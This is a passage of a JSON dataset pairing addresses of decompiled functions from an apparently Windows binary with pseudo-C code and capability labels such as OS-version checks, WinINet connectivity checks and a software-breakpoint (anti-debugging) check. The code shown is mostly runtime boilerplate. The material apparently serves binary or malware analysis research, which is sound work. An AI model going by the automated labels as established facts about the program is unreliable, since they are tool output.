        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004108b4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041227b(0);\n    iVar1 = fcn.00407d16();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        arg_8h_00 = fcn.00405aac(fcn.00409bd0);\n        iVar2 = fcn.00405ac3(0x60);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.0040aeee(0x42dd3c, fcn.0041089a, fcn.00410097, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar3;\n        fcn.00405aac(arg_8h_00);\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 324
    },
    "00410989": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410989(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0041095d();\n    uVar1 = fcn.004435af(uVar1);\n    return uVar1;\n}\n",
        "token_count": 82
    },
    "00411b82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00411b82(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x411c2d;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00411c59;\n        uStack36 = *0x435b90 ^ &fcn.00411b82::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00411b82::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.004188a7();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00411b82::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 724
    },
    "00412a8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.00412a8d(int32_t arg_8h)\n\n{\n    uint64_t uVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint var_48h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (in_EAX == NULL) {\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        return -1;\n    }\n    var_14h = in_EAX[5];\n    var_10h = var_14h >> 0x1f;\n    _var_14h = var_14h;\n    if ((var_10h + -1 + (0x44 < var_14h) == 0) && (_var_14h = var_14h,  var_14h - 0x45 < 0x409)) {\n        iVar4 = in_EAX[4];\n        if ((iVar4 < 0) || (0xb < iVar4)) {\n            uVar3 = iVar4 / 0xc;\n            iVar4 = iVar4 % 0xc;\n            bVar6 = CARRY4(var_14h, uVar3);\n            var_14h = var_14h + uVar3;\n            in_EAX[4] = iVar4;\n            var_10h = var_10h + (uVar3 >> 0x1f) + bVar6;\n            if (iVar4 < 0) {\n                bVar6 = var_14h != 0;\n                var_14h = var_14h - 1;\n                in_EAX[4] = iVar4 + 0xc;\n                var_10h = var_10h + -1 + bVar6;\n            }\n            _var_14h = CONCAT44(var_10h, var_14h);\n            if ((var_10h + -1 + (0x44 < var_14h) != 0) ||\n               (_var_14h = CONCAT44(var_10h, var_14h),  0x408 < var_14h - 0x45)) goto code_r0x00412d2d;\n        }\n        iVar4 = in_EAX[4];\n        var_1ch = *(iVar4 * 4 + 0x43693c);\n        var_18h = var_1ch >> 0x1f;\n        iVar7 = fcn.0041dbc0(var_14h, var_10h, 4, 0);\n        if ((iVar7 == 0) && (uVar3 = var_14h,  iVar7 = fcn.0041dbc0(var_14h, var_10h, 100, 0),  iVar7 != 0)) {\ncode_r0x00412b9b:\n            if (1 < iVar4) {\n                bVar6 = 0xfffffffe < var_1ch;\n                var_1ch = var_1ch + 1;\n                var_18h = var_18h + bVar6;\n            }\n        }\n        else {\n            uVar3 = var_14h + 0x76c;\n            iVar7 = fcn.0041dbc0();\n            if (iVar7 == 0) goto code_r0x00412b9b;\n        }\n        iVar4 = var_14h - 1;\n        var_20h = var_10h - (var_14h == 0);\n        var_24h = iVar4;\n        iVar7 = fcn.004148b0(var_14h + 299, var_10h + (0xfffffed4 < var_14h), 400, 0, uVar3);\n        uVar3 = iVar7 + in_EAX[3];\n        var_ch = iVar7 + in_EAX[3] >> 0x20;\n        uVar8 = fcn.004148b0(iVar4, var_20h, 100, 0);\n        var_ch = (var_ch - (uVar8 >> 0x20)) - (uVar3 < uVar8);\n        iVar7 = fcn.004148b0(iVar4, var_20h, 4, 0);\n        uVar1 = iVar7 + CONCAT44(var_ch, uVar3 - uVar8);\n        var_ch = uVar1 >> 0x20;\n        iVar7 = fcn.00414870(var_14h, var_10h, 0x16d, 0);\n        iVar7 = iVar7 + (uVar1 & 0xffffffff | var_ch << 0x20) + CONCAT44(var_18h, var_1ch);\n        uVar3 = iVar7;\n        iVar7 = fcn.00414870(uVar3 - 0x63df, (iVar7 >> 0x20) - (uVar3 < 0x63df), 0x18, 0);\n        iVar7 = fcn.00414870(iVar7 + in_EAX[2], 0x3c, 0);\n        _var_14h = fcn.00414870(iVar7 + in_EAX[1], 0x3c, 0);\n        _var_14h = _var_14h + *in_EAX;\n        if (arg_8h == 0) {\n            iVar4 = fcn.0041d0d3(&var_48h, &var_14h);\ncode_r0x00412d17:\n            if (iVar4 != 0) goto code_r0x00412d2d;\n        }\n        else {\n            fcn.0041db21();\n            iVar4 = fcn.0041d34f(&var_8h);\n            if (iVar4 != 0) {\n                fcn.00415914(0, 0, 0, 0, 0);\n            }\n            iVar4 = fcn.0041d388(&var_4h);\n            if (iVar4 != 0) {\n                fcn.00415914(0, 0, 0, 0, 0);\n            }\n            _var_14h = _var_14h + var_4h;\n            iVar4 = fcn.00414d1f(&var_48h, &var_14h);\n            if (iVar4 != 0) goto code_r0x00412d2d;\n            if ((0 < in_EAX[8]) || ((in_EAX[8] < 0 && (0 < var_28h)))) {\n                _var_14h = _var_14h + var_8h;\n                iVar4 = fcn.00414d1f(&var_48h, &var_14h);\n                goto code_r0x00412d17;\n            }\n        }\n        piVar5 = &var_48h;\n        for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *in_EAX = *piVar5;\n            piVar5 = piVar5 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    else {\ncode_r0x00412d2d:\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x16;\n        _var_14h = -1;\n    }\n    return _var_14h;\n}\n",
        "token_count": 1800
    },
    "004149af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004149af(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t var_4h;\n    \n    var_4h = -1;\n    if (*0x439110 == 0) {\n        iVar1 = func_0x004a410d(param_2, L\"kernel32.dll\");\n        if (iVar1 != 0) {\n            uVar2 = func_0x00535a2a(&stack0xfffffffc, iVar1, \"HeapQueryInformation\");\n            *0x439114 = fcn.004185e0(uVar2);\n        }\n        *0x439110 = 1;\n    }\n    iVar1 = fcn.00418652();\n    if (*0x439114 != iVar1) {\n        uVar7 = 0;\n        uVar6 = 4;\n        puVar5 = &var_4h;\n        uVar4 = 0;\n        uVar2 = *0x439158;\n        pcVar3 = fcn.0041865b(*0x439114);\n        iVar1 = (*pcVar3)(uVar2, uVar4, puVar5, uVar6, uVar7);\n        if ((iVar1 != 0) && (var_4h == 2)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "00415173": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00415266: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0041526b)\n// WARNING: Removing unreachable block (ram,0x00415299)\n// WARNING: Removing unreachable block (ram,0x00415271)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415173(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x432c30, 0x18);\n    fcn.00415f91(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x439148 != 1) {\n        *0x439144 = 1;\n        *0x439140 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0041865b(*0x43af2c);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0041865b(*0x43af28);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00418652();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0041865b(*piVar2);\n                        iVar3 = fcn.00418652();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0041865b(*0x43af2c);\n                        piVar1 = fcn.0041865b(*0x43af28);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004150ad(0x42c4ac);\n        }\n        fcn.004150ad(0x42c4b4);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00415eb7(8);\n    }\n    return;\n}\n",
        "token_count": 792
    },
    "0041777a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041777a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    code *unaff_ESI;\n    \n    iVar1 = arg_8h;\n    func_0x006cb400();\n    (*unaff_ESI)(arg_8h);\n    if (*(arg_8h + 0xb0) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xb0));\n    }\n    if (*(arg_8h + 0xb8) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xb8));\n    }\n    if (*(arg_8h + 0xb4) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xb4));\n    }\n    if (*(arg_8h + 0xc0) != 0) {\n        (*unaff_ESI)(*(arg_8h + 0xc0));\n    }\n    piVar2 = arg_8h + 0x50;\n    arg_8h = 6;\n    do {\n        if ((piVar2[-2] != 0x436458) && (*piVar2 != 0)) {\n            (*unaff_ESI)(*piVar2);\n        }\n        if ((piVar2[-1] != 0) && (piVar2[1] != 0)) {\n            (*unaff_ESI)(piVar2[1]);\n        }\n        piVar2 = piVar2 + 4;\n        arg_8h = arg_8h + -1;\n    } while (arg_8h != 0);\n    (*unaff_ESI)(*(iVar1 + 0xd4) + 0xb4);\n    return;\n}\n",
        "token_count": 398
    },
    "00417809": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417809(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    code *unaff_ESI;\n    \n    iVar1 = arg_8h;\n    if (arg_8h != 0) {\n        func_0x006670da();\n        (*unaff_ESI)(arg_8h);\n        if (*(arg_8h + 0xb0) != 0) {\n            (*unaff_ESI)(*(arg_8h + 0xb0));\n        }\n        if (*(arg_8h + 0xb8) != 0) {\n            (*unaff_ESI)(*(arg_8h + 0xb8));\n        }\n        if (*(arg_8h + 0xb4) != 0) {\n            (*unaff_ESI)(*(arg_8h + 0xb4));\n        }\n        if (*(arg_8h + 0xc0) != 0) {\n            (*unaff_ESI)(*(arg_8h + 0xc0));\n        }\n        piVar2 = arg_8h + 0x50;\n        arg_8h = 6;\n        do {\n            if ((piVar2[-2] != 0x436458) && (*piVar2 != 0)) {\n                (*unaff_ESI)(*piVar2);\n            }\n            if ((piVar2[-1] != 0) && (piVar2[1] != 0)) {\n                (*unaff_ESI)(piVar2[1]);\n            }\n            piVar2 = piVar2 + 4;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n        (*unaff_ESI)(*(iVar1 + 0xd4) + 0xb4);\n    }\n    return iVar1;\n}\n",
        "token_count": 415
    },
    "0041b629": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041b629(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004188a7();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.004188a7();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0041b904": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b904(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00411dc0(*(unaff_EBP + -0x28));\n    iVar1 = fcn.004188a7();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.004188a7();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00411d99(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0041b689(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "0041e722": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041e722(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uchar *in_ECX;\n    uint uVar4;\n    uchar *puVar5;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    fcn.0041102a(arg_14h);\n    if ((in_ECX == NULL) || (arg_8h == 0)) {\n        puVar3 = fcn.004125de();\n        uVar4 = 0x16;\n        *puVar3 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n    }\n    else {\n        if ((arg_10h != '\\0') && (iVar1 + -1 == arg_ch)) {\n            iVar2 = *in_EAX;\n            in_ECX[(iVar2 == 0x2d) + iVar1 + -1] = 0x30;\n            (in_ECX + (iVar2 == 0x2d) + iVar1 + -1)[1] = 0;\n        }\n        if (*in_EAX == 0x2d) {\n            *in_ECX = 0x2d;\n            in_ECX = in_ECX + 1;\n        }\n        if (in_EAX[1] < 1) {\n            fcn.0041e10b();\n            *in_ECX = 0x30;\n            puVar5 = in_ECX + 1;\n        }\n        else {\n            puVar5 = in_ECX + in_EAX[1];\n        }\n        if (0 < arg_ch) {\n            fcn.0041e10b();\n            *puVar5 = ***(var_10h + 0xbc);\n            iVar1 = in_EAX[1];\n            if (iVar1 < 0) {\n                if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar1) == arg_ch + iVar1 < 0)) {\n                    arg_ch = -iVar1;\n                }\n                fcn.0041e10b();\n                fcn.00410fb0(puVar5 + 1, 0x30, arg_ch);\n            }\n        }\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 672
    },
    "0041f033": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041f033(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00415eb7(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004206ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.004206ec(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    int32_t var_4ch;\n    uint var_48h;\n    uchar *var_44h;\n    uint8_t *var_40h;\n    ushort *var_3ch;\n    uchar *var_38h;\n    ushort *var_34h;\n    uint32_t var_30h;\n    uint *var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint8_t *var_1ch;\n    uint32_t var_18h;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    var_2ch = NULL;\n    var_1ch = NULL;\n    var_20h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_4ch = arg_8h;\n    var_48h = 0;\n    if (*(arg_8h + 0x14) == 0) {\n        iVar3 = *(arg_8h + 0xc0);\n        if (iVar3 != 0) {\n            func_0x006eeec5(&stack0xfffffffc, iVar3);\n        }\n        *(arg_8h + 0xc0) = 0;\n        *(arg_8h + 0xc4) = 0;\n        *(arg_8h + 200) =\n             L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x81\\x81\\x81\\x81\\x81\\x81\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x10\\x10\\x10\\x10\\x10\\x10\\x82\\x82\\x82\\x82\\x82\\x82\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x10\\x10\\x10\\x10 \"\n        ;\n        *(arg_8h + 0xcc) = 0x42f4d0;\n        *(arg_8h + 0xd0) = 0x42f650;\n        *(arg_8h + 0xac) = 1;\n        goto code_r0x00420a7f;\n    }\n    if ((*(arg_8h + 4) == 0) && (iVar3 = fcn.0041cf45(&var_4ch, 0, *(arg_8h + 0x30), 0x1004, arg_8h + 4),  iVar3 != 0))\n    {\ncode_r0x00420a12:\n        fcn.00410dee(var_2ch);\n        fcn.00410dee(var_1ch);\n        fcn.00410dee(var_20h);\n        fcn.00410dee(var_28h);\n    }\n    else {\n        var_2ch = fcn.0041c21c(4);\n        var_1ch = fcn.0041c261(0x180, 2);\n        var_20h = fcn.0041c261(0x180, 1);\n        var_28h = fcn.0041c261(0x180, 1);\n        var_24h = fcn.0041c261(0x101, 1);\n        if ((var_2ch == NULL) || ((((var_1ch == NULL || (var_24h == 0)) || (var_20h == 0)) || (var_28h == 0))))\n        goto code_r0x00420a12;\n        *var_2ch = 0;\n        iVar3 = 0;\n        do {\n            *(iVar3 + var_24h) = iVar3;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x100);\n        iVar3 = func_0x0051d82f(0x180, *(arg_8h + 4), &var_18h);\n        if ((iVar3 == 0) || (5 < var_18h)) goto code_r0x00420a12;\n        var_30h = var_18h & 0xffff;\n        if ((1 < var_30h) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                uVar2 = *puVar4;\n                if (uVar2 == 0) break;\n                for (uVar7 = puVar4[-1]; uVar7 <= uVar2; uVar7 = uVar7 + 1) {\n                    *(uVar7 + var_24h) = 0x20;\n                    uVar2 = *puVar4;\n                }\n                puVar5 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar5 != 0);\n        }\n        var_40h = var_1ch + 0x100;\n        iVar3 = fcn.0041faf5(0, 1, var_24h, 0x100, var_40h, *(arg_8h + 4), 0, 0);\n        if (((iVar3 == 0) ||\n            (iVar3 = fcn.0041f8f6(0, *(arg_8h + 0x14), 0x100, var_24h + 1, 0xff, var_20h + 0x81, 0xff, *(arg_8h + 4), 0)\n            ,  iVar3 == 0)) ||\n           (iVar3 = fcn.0041f8f6(0, *(arg_8h + 0x14), 0x200, var_24h + 1, 0xff, var_28h + 0x81, 0xff, *(arg_8h + 4), 0)\n           ,  puVar4 = var_1ch,  uVar7 = var_20h,  iVar3 == 0)) goto code_r0x00420a12;\n        var_3ch = var_1ch + 0xfe;\n        *var_3ch = 0;\n        var_44h = var_20h + 0x80;\n        *(var_20h + 0x7f) = 0;\n        *(var_28h + 0x7f) = 0;\n        *var_44h = 0;\n        var_38h = var_28h + 0x80;\n        *var_38h = 0;\n        puVar5 = var_1ch;\n        if ((1 < var_30h) && (var_12h != '\\0')) {\n            puVar5 = &var_12h + 1;\n            do {\n                if (*puVar5 == 0) break;\n                var_20h = puVar5[-1];\n                if (var_20h <= *puVar5) {\n                    var_34h = var_1ch + var_20h * 2 + 0x100;\n                    do {\n                        var_20h = var_20h + 1;\n                        *var_34h = 0x8000;\n                        var_34h = var_34h + 1;\n                    } while (var_20h <= *puVar5);\n                }\n                puVar6 = puVar5 + 2;\n                puVar1 = puVar5 + 1;\n                puVar5 = puVar6;\n            } while (*puVar1 != 0);\n        }\n        var_1ch = puVar5;\n        fcn.004155a0(puVar4, puVar4 + 0x200, 0xfe);\n        fcn.004155a0(uVar7, uVar7 + 0x100, 0x7f);\n        fcn.004155a0(var_28h, var_28h + 0x100, 0x7f);\n        if (*(arg_8h + 0xc0) != 0) {\n            func_0x00523499(*(arg_8h + 0xc0));\n            return;\n        }\n        *var_2ch = 1;\n        *(arg_8h + 0xc0) = var_2ch;\n        *(arg_8h + 200) = var_40h;\n        *(arg_8h + 0xc4) = var_3ch;\n        *(arg_8h + 0xcc) = var_44h;\n        *(arg_8h + 0xd0) = var_38h;\n        *(arg_8h + 0xac) = var_30h;\n    }\n    fcn.00410dee(var_24h);\ncode_r0x00420a7f:\n    fcn.00410f95(var_4ch);\n    return;\n}\n",
        "token_count": 2153
    },
    "00421095": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421095(char *arg_8h)\n\n{\n    char *pcVar1;\n    char **arg_10h;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    char **arg_10h_00;\n    \n    iVar2 = fcn.004188a7();\n    arg_10h_00 = iVar2 + 0x9c;\n    if (arg_8h == NULL) {\n        *(iVar2 + 0xa4) = *(iVar2 + 0xa4) | 0x104;\n    }\n    else {\n        pcVar1 = arg_8h + 0x40;\n        arg_10h = iVar2 + 0xa0;\n        *arg_10h_00 = arg_8h;\n        *arg_10h = pcVar1;\n        if ((pcVar1 != NULL) && (*pcVar1 != '\\0')) {\n            fcn.00420ada(0x42ff90, 0x16, arg_10h);\n        }\n        *(iVar2 + 0xa4) = 0;\n        if ((*arg_10h_00 != NULL) && (**arg_10h_00 != '\\0')) {\n            if ((*arg_10h == NULL) || (**arg_10h == '\\0')) {\n                fcn.00421059();\n            }\n            else {\n                fcn.00420ff2();\n            }\n            if (*(iVar2 + 0xa4) == 0) {\n                iVar3 = fcn.00420ada(0x42fd88, 0x40, arg_10h_00);\n                if (iVar3 != 0) {\n                    if ((*arg_10h == NULL) || (**arg_10h == '\\0')) {\n                        fcn.00421059();\n                    }\n                    else {\n                        fcn.00420ff2();\n                    }\n                }\n                if (*(iVar2 + 0xa4) == 0) {\n                    return 0;\n                }\n            }\n            uVar5 = fcn.00420b3c();\n            if (((uVar5 != 0) && (uVar5 != 65000)) && (uVar5 != 0xfde9)) {\n                uVar4 = func_0x00533e9f(uVar5 & 0xffff);\n                return uVar4;\n            }\n            return 0;\n        }\n        pcVar1 = *arg_10h;\n        if ((pcVar1 != NULL) && (*pcVar1 != '\\0')) {\n            iVar3 = fcn.004121f0(pcVar1);\n            *(iVar2 + 0xb0) = iVar3 == 3;\n            uVar4 = func_0x0056aa63(fcn.00420c53, 1);\n            return uVar4;\n        }\n        